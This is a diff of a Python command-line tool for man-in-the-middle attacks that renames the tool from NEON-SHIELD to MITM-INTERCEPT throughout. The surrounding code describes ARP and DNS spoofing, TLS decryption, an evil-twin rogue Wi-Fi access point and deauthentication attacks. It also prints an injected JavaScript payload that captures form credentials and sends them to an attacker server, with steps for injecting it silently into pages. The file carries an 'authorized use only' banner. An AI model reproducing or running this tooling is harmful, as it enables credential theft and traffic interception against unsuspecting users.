@@ -1,14 +1,14 @@
 #!/usr/bin/env python3
 """
-NEON-SHIELD CLI — Robust, user-friendly command interface.
+MITM-INTERCEPT CLI — Robust, user-friendly command interface.
 
 Usage:
-    neon-shield init          # Interactive first-time setup
-    neon-shield start         # Start interception (auto-loads config)
-    neon-shield stop          # Stop interception (restore ARP/iptables)
-    neon-shield status        # Check current status
-    neon-shield cleanup       # Emergency recovery (restore everything)
-    neon-shield test          # Validate config (dry-run)
+    mitm-intercept init          # Interactive first-time setup
+    mitm-intercept start         # Start interception (auto-loads config)
+    mitm-intercept stop          # Stop interception (restore ARP/iptables)
+    mitm-intercept status        # Check current status
+    mitm-intercept cleanup       # Emergency recovery (restore everything)
+    mitm-intercept test          # Validate config (dry-run)
 """
 import sys
 import os
@@ -33,7 +33,7 @@ console = Console()
 LEGAL_BANNER = """
 ⚠️  AUTHORIZED USE ONLY
 
-NEON-SHIELD performs active MITM attacks (ARP spoofing, TLS decryption,
+MITM-INTERCEPT performs active MITM attacks (ARP spoofing, TLS decryption,
 credential capture, DNS spoofing). These are federal crimes without
 explicit authorization.
 
@@ -48,9 +48,9 @@ See README.md for full disclaimer.
 
 
 @click.group()
-@click.version_option(version="2.0.0", prog_name="NEON-SHIELD")
+@click.version_option(version="2.0.0", prog_name="MITM-INTERCEPT")
 def cli():
-    """NEON-SHIELD — Advanced MITM Lab for Authorized Security Research (Educational Use Only)"""
+    """MITM-INTERCEPT — Advanced MITM Lab for Authorized Security Research (Educational Use Only)"""
     pass
 
 
@@ -67,8 +67,8 @@ def init():
         from setup_wizard import run_wizard
         config_dict = run_wizard()
 
-        # TODO: Save to neon-shield.yml
-        console.print("[green]✓ Configuration saved to neon-shield.yml[/green]")
+        # TODO: Save to mitm-intercept.yml
+        console.print("[green]✓ Configuration saved to mitm-intercept.yml[/green]")
     except Exception as e:
         console.print(f"[red]Setup failed: {e}[/red]")
         sys.exit(1)
@@ -81,7 +81,7 @@ def init():
 @click.option("--verbose", is_flag=True, help="Verbose output")
 @click.option("-y", "--yes", is_flag=True, help="Skip confirmation")
 def start(targets, interface, dns_redirect, verbose, yes):
-    """Start NEON-SHIELD interception."""
+    """Start MITM-INTERCEPT interception."""
     console.print(Panel(LEGAL_BANNER, style="bold red"))
 
     if not yes:
@@ -90,7 +90,7 @@ def start(targets, interface, dns_redirect, verbose, yes):
             sys.exit(1)
 
     # Load config
-    config = load_config("neon-shield.yml")
+    config = load_config("mitm-intercept.yml")
     cli_args = {
         "targets": targets,
         "interface": interface,
@@ -111,7 +111,7 @@ def start(targets, interface, dns_redirect, verbose, yes):
     setup_logging(config.log_file, config.log_level, config.max_log_size_mb, config.log_backup_count, verbose)
 
     console.print("[green]✓ Configuration loaded[/green]")
-    console.print("[cyan]Starting NEON-SHIELD...[/cyan]")
+    console.print("[cyan]Starting MITM-INTERCEPT...[/cyan]")
 
     # Import and run proxy
     try:
@@ -126,18 +126,18 @@ def start(targets, interface, dns_redirect, verbose, yes):
 
 @cli.command()
 def stop():
-    """Stop NEON-SHIELD interception and restore network state."""
-    console.print("[yellow]Stopping NEON-SHIELD...[/yellow]")
+    """Stop MITM-INTERCEPT interception and restore network state."""
+    console.print("[yellow]Stopping MITM-INTERCEPT...[/yellow]")
     # TODO: Send signal to running instance
     console.print("[green]✓ Stopped[/green]")
 
 
 @cli.command()
 def status():
-    """Check NEON-SHIELD status."""
+    """Check MITM-INTERCEPT status."""
     state = state_manager.load_state()
 
-    table = Table(title="NEON-SHIELD Status")
+    table = Table(title="MITM-INTERCEPT Status")
     table.add_column("Component", style="cyan")
     table.add_column("Status", style="magenta")
 
@@ -192,7 +192,7 @@ def test(targets, interface):
     """Validate configuration without running interception (dry-run mode)."""
     console.print("[cyan]Running configuration test (dry-run)...[/cyan]\n")
 
-    config = load_config("neon-shield.yml")
+    config = load_config("mitm-intercept.yml")
     cli_args = {"targets": targets, "interface": interface, "dry_run": True}
     config = merge_with_cli(config, cli_args)
 
@@ -220,7 +220,7 @@ def ap_mode(interface, ssid, channel, yes):
     🔴 Create rogue WiFi access point (Evil Twin).
 
     Broadcasts a fake WiFi network with the same name as a popular WiFi (e.g., Starbucks_WiFi).
-    Nearby devices auto-connect, exposing all their traffic to NEON-SHIELD.
+    Nearby devices auto-connect, exposing all their traffic to MITM-INTERCEPT.
 
     ⚠️ EXTREMELY POWERFUL ATTACK: All devices that connect will have their traffic intercepted.
     """
@@ -259,7 +259,7 @@ def ap_mode(interface, ssid, channel, yes):
 
     # Check root
     if os.geteuid() != 0:
-        console.print("[red]❌ Root required. Retry with: sudo neon-shield phase1 ap-mode[/red]")
+        console.print("[red]❌ Root required. Retry with: sudo mitm-intercept phase1 ap-mode[/red]")
         sys.exit(1)
 
     # Check requirements
@@ -322,7 +322,7 @@ This will scan nearby networks and show:
 
     # Check root
     if os.geteuid() != 0:
-        console.print("[red]Root required. Retry with: sudo neon-shield phase1 scan-networks[/red]")
+        console.print("[red]Root required. Retry with: sudo mitm-intercept phase1 scan-networks[/red]")
         sys.exit(1)
 
     # Check requirements
@@ -390,7 +390,7 @@ def deauth(interface, target_mac, gateway_mac, ssid, count, yes):
 
     # Check root
     if os.geteuid() != 0:
-        console.print("[red]Root required. Retry with: sudo neon-shield phase1 deauth ...[/red]")
+        console.print("[red]Root required. Retry with: sudo mitm-intercept phase1 deauth ...[/red]")
         sys.exit(1)
 
     # Check requirements
@@ -891,7 +891,7 @@ def inject_payload(domain):
 
     payload = f"""
 <script>
-// NEON-SHIELD Session Hijacking Payload
+// MITM-INTERCEPT Session Hijacking Payload
 // This demonstrates how attackers steal credentials silently
 
 (function() {{
@@ -922,7 +922,7 @@ def inject_payload(domain):
     const credentials = Object.fromEntries(formData);
 
     // Log password attempts
-    console.warn('[NEON-SHIELD] Form submission captured:', credentials);
+    console.warn('[MITM-INTERCEPT] Form submission captured:', credentials);
 
     // Send to attacker
     fetch(ATTACKER_SERVER, {{
@@ -988,7 +988,7 @@ def inject_payload(domain):
     }})
   }}).catch(() => {{}});
 
-  console.log('[NEON-SHIELD] Injection active. Stealing data...');
+  console.log('[MITM-INTERCEPT] Injection active. Stealing data...');
 }})();
 </script>
 """
@@ -998,16 +998,16 @@ def inject_payload(domain):
     console.print("\n[bold red]⚠️  HOW THIS WOULD BE INJECTED:[/bold red]\n")
 
     console.print(f"""
-[bold]Method 1: MITM Proxy Injection (What NEON-SHIELD does)[/bold]
+[bold]Method 1: MITM Proxy Injection (What MITM-INTERCEPT does)[/bold]
   1. Victim visits normal website: https://{domain}
-  2. NEON-SHIELD intercepts response
+  2. MITM-INTERCEPT intercepts response
   3. Adds malicious <script> to bottom of HTML
   4. Victim sees normal page (no visible difference)
   5. JavaScript runs silently in background
   6. All data exfiltrated to attacker's server
 
 [bold]Method 2: DNS Hijacking[/bold]
-  1. NEON-SHIELD redirects {domain} to fake server
+  1. MITM-INTERCEPT redirects {domain} to fake server
   2. Fake server serves malicious page with payload
   3. Victim thinks they're on real site
   4. Payload steals everything
@@ -2255,7 +2255,7 @@ def main():
     if (os.geteuid() != 0 and len(sys.argv) > 1 and
         sys.argv[1] in needs_root_commands and "--help" not in sys.argv):
         console.print("[red]Error: This command requires root privileges.[/red]")
-        console.print("Retry with: sudo neon-shield " + " ".join(sys.argv[1:]))
+        console.print("Retry with: sudo mitm-intercept " + " ".join(sys.argv[1:]))
         sys.exit(1)
 
     cli()
